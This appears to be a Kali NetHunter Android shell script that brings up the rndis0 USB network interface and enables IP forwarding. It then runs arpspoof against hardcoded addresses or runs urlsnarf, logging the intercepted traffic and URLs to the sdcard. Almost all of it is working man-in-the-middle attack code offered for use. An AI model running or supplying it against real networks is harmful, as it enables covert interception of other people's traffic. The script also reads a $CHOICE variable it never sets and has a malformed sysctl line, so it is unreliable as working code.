#!/system/bin/sh
echo ""
echo ""
echo "If you get error that rndis0 isnt up then use usb arsenal to activate rndis and use"
echo "Android su: ifconfig rndis0 up"
echo ""
echo ""
# Export needed paths for chroot commands

## Define the nethunter app package name.
APP_PGK_NAME=com.offsec.nethunter

## Define the root directory path of chroot containers
NHSYSTEM_PATH=/data/local/nhsystem

## Define chroot sudo path
CHROOT_EXEC=/usr/bin/sudo

## Combine android $PATH to kali chroot $PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH

## Define busybox path.
BUSYBOX=`which busybox_nh | head -n1`
if [ -z "$BUSYBOX" ]; then
    if [ -x "/system/xbin/busybox_nh" ]; then
        BUSYBOX="/system/xbin/busybox_nh"
    elif [ -x "/system/bin/busybox_nh" ]; then
        BUSYBOX="/system/bin/busybox_nh"
    elif [ -x "/data/data/$APP_PGK_NAME/files/scripts/bin/busybox_nh" ]; then
        BUSYBOX="/data/data/$APP_PGK_NAME/files/scripts/bin/busybox_nh"
    fi
fi

## Define the Kali Chroot path.
MNT=`readlink -e $NHSYSTEM_PATH/kalifs`
if [ -z "$MNT" ]; then
    MNT=`cat /data/data/$APP_PGK_NAME/shared_prefs/$APP_PGK_NAME.xml | grep "\"chroot_path\"" | sed "s/^.*\"chroot_path\">\(.*\)<\/string>/\1/g"`
fi

## Define the path of xz tool
XZ=/data/data/$APP_PGK_NAME/files/scripts/bin/xz

TMPDIR=/data/local/tmp
su -c mkdir -p $TMPDIR
su -c mkdir /sdcard/nh_files/simple_usb
INTERFACE=rndis0
UPSTREAM=wlan0


# Endo of exports

# Set rndis up
$BUSYBOX chroot $MNT sudo ifconfig $INTERFACE up
$BUSYBOX chroot $MNT sudo sysctl -w net.ipv4.ip_forward=1 net.ipv4.ip_forward = 1

case $CHOICE in
1)
$BUSYBOX chroot $MNT sudo arpspoof -i rndis0 -t 192.168.1.3 -r 192.168.1.1 > /sdcard/nh_files/simple_usb/arpspoof1.log
;;
2)
$BUSYBOX chroot $MNT sudo arpspoof -i rndis0 -t 192.168.1.1 -r 192.168.1.3 > /sdcard/nh_files/simple_usb/arpspoof1.log

;;
3)
urlsnarf -i rndis0 > /sdcard/nh_files/simple_usb/urlsnarf.log
;;

esac